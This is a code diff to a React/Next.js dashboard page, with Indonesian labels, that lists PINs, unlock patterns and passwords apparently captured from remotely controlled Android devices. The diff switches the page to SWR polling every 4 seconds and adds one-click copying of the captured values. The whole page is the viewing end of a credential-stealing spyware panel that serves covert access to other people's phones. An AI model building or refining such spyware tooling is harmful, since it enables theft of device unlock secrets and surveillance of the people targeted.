@@ -1,6 +1,6 @@
 'use client'
 
-import { useState, useEffect, useCallback } from 'react'
+import { useState, useCallback } from 'react'
 import Sidebar from '@/components/Sidebar'
 import { useDevice } from '@/contexts/DeviceContext'
 import {
@@ -8,6 +8,7 @@ import {
   Hash, Grid3x3, KeyRound, HelpCircle, WifiOff,
   Lock, ListFilter,
 } from 'lucide-react'
+import useSWR from 'swr'
 
 interface PinCapture {
   id: number
@@ -88,37 +89,30 @@ function PatternDots({ value }: { value: string }) {
   )
 }
 
+const fetcher = (url: string) => fetch(url).then(r => r.json())
+
 export default function PinLogPage() {
   const { devices, selectedId: deviceId, setSelectedId: setDeviceId, connected } = useDevice()
-  const [captures, setCaptures]   = useState<PinCapture[]>([])
-  const [loading, setLoading]     = useState(false)
-  const [copied, setCopied]       = useState<number | null>(null)
-  const [filter, setFilter]       = useState<string>('all')
+  const [copied, setCopied] = useState<number | null>(null)
+  const [filter, setFilter] = useState<string>('all')
 
-  const fetchCaptures = useCallback(async () => {
-    if (!deviceId) return
-    setLoading(true)
-    try {
-      const res  = await fetch(`/api/device/pinlog?deviceId=${deviceId}&limit=200`)
-      const data = await res.json()
-      if (data.captures) setCaptures(data.captures)
-    } finally {
-      setLoading(false)
+  const { data, isLoading, mutate } = useSWR(
+    deviceId ? `/api/device/pinlog?deviceId=${deviceId}&limit=200` : null,
+    fetcher,
+    {
+      refreshInterval: 4000,
+      keepPreviousData: true,
+      revalidateOnFocus: true,
     }
-  }, [deviceId])
+  )
 
-  useEffect(() => {
-    if (!deviceId) return
-    fetchCaptures()
-    const t = setInterval(fetchCaptures, 3000)
-    return () => clearInterval(t)
-  }, [deviceId, fetchCaptures])
+  const captures: PinCapture[] = data?.captures ?? []
 
-  const handleClear = async () => {
+  const handleClear = useCallback(async () => {
     if (!deviceId || !confirm('Hapus semua data PIN/Pola/Sandi?')) return
     await fetch(`/api/device/pinlog?deviceId=${deviceId}`, { method: 'DELETE' })
-    setCaptures([])
-  }
+    mutate({ captures: [] }, { revalidate: false })
+  }, [deviceId, mutate])
 
   const copyValue = (id: number, value: string) => {
     navigator.clipboard.writeText(value)
@@ -126,7 +120,7 @@ export default function PinLogPage() {
     setTimeout(() => setCopied(null), 2000)
   }
 
-  const filtered  = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)
+  const filtered = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)
 
   const fmt = (iso: string) =>
     new Date(iso).toLocaleString('id-ID', {
@@ -148,7 +142,6 @@ export default function PinLogPage() {
       <main className="flex-1 page-content overflow-y-auto">
         <div className="max-w-2xl mx-auto px-3 md:px-6 py-4 md:py-6">
 
-          {/* Header */}
           <div className="flex items-center justify-between mb-4">
             <div className="flex items-center gap-2.5">
               <div className="p-2 rounded-xl bg-android-red/10">
@@ -157,18 +150,18 @@ export default function PinLogPage() {
               <div>
                 <h2 className="text-base md:text-lg font-bold text-white leading-tight">PIN / Pola / Sandi</h2>
                 <p className="text-[11px] text-android-muted">
-                  {captures.length} entri tersimpan
+                  {captures.length} entri tersimpan · auto-sync 4s
                 </p>
               </div>
             </div>
             <div className="flex gap-1.5">
               <button
-                onClick={fetchCaptures}
-                disabled={loading}
+                onClick={() => mutate()}
+                disabled={isLoading}
                 className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors disabled:opacity-50"
                 title="Refresh"
               >
-                <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
+                <RefreshCw size={14} className={isLoading ? 'animate-spin' : ''} />
               </button>
               <button
                 onClick={handleClear}
@@ -180,7 +173,6 @@ export default function PinLogPage() {
             </div>
           </div>
 
-          {/* Filter tabs */}
           <div className="flex gap-1.5 mb-4 overflow-x-auto pb-1 scrollbar-none">
             {filterTabs.map(({ key, label, icon }) => {
               const count = key === 'all' ? captures.length : captures.filter(c => c.lockType === key).length
@@ -207,8 +199,7 @@ export default function PinLogPage() {
             })}
           </div>
 
-          {/* Notices */}
-          {connected && captures.length === 0 && !loading && (
+          {connected && captures.length === 0 && !isLoading && (
             <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl flex items-start gap-2.5 text-xs text-android-yellow">
               <ShieldAlert size={14} className="shrink-0 mt-0.5" />
               <div>
@@ -227,8 +218,7 @@ export default function PinLogPage() {
             </div>
           )}
 
-          {/* List */}
-          {loading && captures.length === 0 ? (
+          {isLoading && captures.length === 0 ? (
             <div className="text-center py-12 text-android-muted text-sm">Memuat…</div>
           ) : filtered.length === 0 ? (
             <div className="text-center py-12">
@@ -247,7 +237,6 @@ export default function PinLogPage() {
                     key={c.id}
                     className="bg-android-surface border border-android-border rounded-xl p-3 md:p-4 hover:border-android-muted/40 transition-colors"
                   >
-                    {/* Top row: badge + time + copy */}
                     <div className="flex items-center justify-between mb-2.5">
                       <div className={`flex items-center gap-1.5 px-2 py-1 rounded-lg text-[11px] font-bold border ${info.textColor} ${info.bgColor} ${info.borderColor}`}>
                         {info.icon}
@@ -269,7 +258,6 @@ export default function PinLogPage() {
                       </div>
                     </div>
 
-                    {/* Value row */}
                     <div className="flex items-center gap-3">
                       {isPattern && <PatternDots value={c.value} />}
                       <div className="min-w-0 flex-1">
@@ -288,7 +276,6 @@ export default function PinLogPage() {
             </div>
           )}
 
-          {/* Footer */}
           {filtered.length > 0 && (
             <p className="text-center text-[11px] text-android-muted mt-4 pb-2">
               Menampilkan {filtered.length} dari {captures.length} entri
